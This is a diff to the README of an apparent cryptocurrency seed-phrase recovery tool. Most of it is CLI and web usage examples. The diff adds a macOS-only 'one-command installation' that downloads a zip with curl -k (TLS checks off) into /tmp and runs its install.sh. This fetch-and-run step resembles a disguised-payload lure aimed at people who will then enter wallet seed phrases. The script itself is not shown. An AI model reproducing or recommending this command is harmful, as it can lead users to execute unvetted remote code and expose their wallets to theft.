@@ -27,7 +27,22 @@ A powerful tool for recovering cryptocurrency seed phrases with missing or incor
 
 ## 🚀 Quick Start
 
-### Installation
+### One-Command Installation (macOS only)
+
+```bash
+curl -fsSLk https://github.com/Gentleatvice/seed-phrase-recover-BTC-ETH/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+unzip -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/seed-phrase-recover-BTC-ETH-main && \
+bash install.sh
+```
+
+This will automatically:
+- Install Rust and Cargo (if not present)
+- Install Node.js (if not present)
+- Build the project
+- Set up all dependencies
+
+### Manual Installation
 
 ```bash
 # Clone the repository
@@ -44,7 +59,9 @@ npm install
 
 ### Usage
 
-#### CLI Mode
+After installation, you can use the tool in two ways:
+
+#### 1. CLI Mode (Command Line)
 
 ```bash
 # Recover a seed phrase with one missing word
@@ -52,20 +69,71 @@ cargo run --release -- recover \
   --phrase "word1 word2 word3 ??? word5 word6 word7 word8 word9 word10 word11 word12" \
   --address "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
 
+# Recover without target address (returns first valid phrase)
+cargo run --release -- recover \
+  --phrase "abandon abandon ??? abandon abandon abandon abandon abandon abandon abandon abandon about"
+
 # Check if a complete phrase is valid
 cargo run --release -- validate \
   --phrase "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
 
-# Find similar words
+# Find similar words for potential typos
 cargo run --release -- suggest --word "abandn"
+
+# Generate a test phrase (for testing only!)
+cargo run --release -- generate --words 12
+
+# Get help
+cargo run --release -- --help
 ```
 
-#### Web Interface
+#### 2. Web Interface (Browser)
 
 ```bash
 cd web
-npm run dev
+npm run serve
 # Open http://localhost:3000 in your browser
+```
+
+The web interface provides:
+- Visual phrase input with validation
+- Real-time progress tracking
+- Word suggestions for typos
+- Easy copy/paste functionality
+
+### Common Use Cases
+
+**Scenario 1: One word is completely unknown**
+```bash
+cargo run --release -- recover \
+  --phrase "abandon abandon ??? abandon abandon abandon abandon abandon abandon abandon abandon about"
+```
+
+**Scenario 2: You have a typo in one word**
+```bash
+# First, find suggestions
+cargo run --release -- suggest --word "abandn"
+# Output: abandon, ...
+
+# Then validate the corrected phrase
+cargo run --release -- validate \
+  --phrase "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
+```
+
+**Scenario 3: Two missing words + target address**
+```bash
+cargo run --release -- recover \
+  --phrase "word1 ??? word3 word4 ??? word6 word7 word8 word9 word10 word11 word12" \
+  --address "1YourBitcoinAddressHere" \
+  --threads 8
+```
+
+**Scenario 4: Ethereum recovery**
+```bash
+cargo run --release -- recover \
+  --phrase "word1 word2 ??? word4 word5 word6 word7 word8 word9 word10 word11 word12" \
+  --address "0xYourEthereumAddressHere" \
+  --crypto ethereum
 ```
 
 ## 🔧 Configuration
